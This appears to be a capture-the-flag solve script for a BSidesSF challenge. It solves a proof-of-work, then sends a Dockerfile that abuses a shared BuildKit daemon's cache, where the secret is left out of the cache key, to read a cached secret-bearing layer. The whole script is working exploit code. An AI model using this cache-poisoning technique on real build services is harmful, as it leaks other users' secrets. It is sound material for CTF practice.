#!/usr/bin/env python3
"""builds-as-a-service — BuildKit cache poisoning: secret not in cache key"""
from pwn import *
import subprocess, time, re, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else 'builds-as-a-service-657418c1.challenges.bsidessf.net'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4445

io = remote(HOST, PORT)
time.sleep(2)
data = io.recv(timeout=5).decode()

# --- Solve PoW (hashcash) ---
match = re.search(r'hashcash -mb(\d+) "([^"]+)"', data)
if match:
    log.info(f"Solving PoW: bits={match.group(1)} resource={match.group(2)}")
    result = subprocess.run(
        ['hashcash', f'-mb{match.group(1)}', match.group(2)],
        capture_output=True, text=True, timeout=300
    )
    io.sendline(result.stdout.strip().encode())
    time.sleep(5)
    io.recv(timeout=5)
else:
    log.warning("No PoW prompt found, continuing...")

# --- Send exploit Dockerfile ---
# 1. Copy buildctl from official image
# 2. Extract random BUILD_VERSION from cache metadata
# 3. Rebuild flag Dockerfile with fake secret → cache hit on real flag layer
# 4. Read /flag.txt from cached output
dockerfile = r"""FROM moby/buildkit:v0.17.1 AS buildkit
FROM alpine:3.23.3
COPY --from=buildkit /usr/bin/buildctl /usr/bin/buildctl
RUN set -e && \
    VERSION=$(buildctl --addr tcp://127.0.0.1:1234 du --verbose 2>&1 \
      | grep "echo " | sed 's/.*echo //' | sed 's/ .*//' | head -1) && \
    echo "fake" > /tmp/fake_flag.txt && \
    printf 'FROM alpine:3.23.3\nRUN echo %s > /tmp/version\nRUN --mount=type=secret,id=flag cp /run/secrets/flag /flag.txt\n' "$VERSION" > /tmp/Dockerfile.rebuild && \
    buildctl --addr tcp://127.0.0.1:1234 build \
      --frontend dockerfile.v0 \
      --local context=/tmp \
      --local dockerfile=/tmp \
      --opt filename=Dockerfile.rebuild \
      --secret id=flag,src=/tmp/fake_flag.txt \
      --output type=local,dest=/tmp/out 2>&1 && \
    cat /tmp/out/flag.txt && false
"""
io.send(dockerfile.encode())
io.send(b'\x04')  # EOF

# --- Wait for build and extract flag ---
log.info("Waiting for build (can take 60-120s)...")
time.sleep(60)
raw = io.recvall(timeout=120).decode('latin-1')

# Strip ANSI escape codes
clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', raw)

flag = re.search(r'CTF\{[^}]+\}', clean)
if flag:
    log.success(f"FLAG: {flag.group()}")
else:
    log.warning("Flag not found in output")
    print(clean[-500:])

io.close()
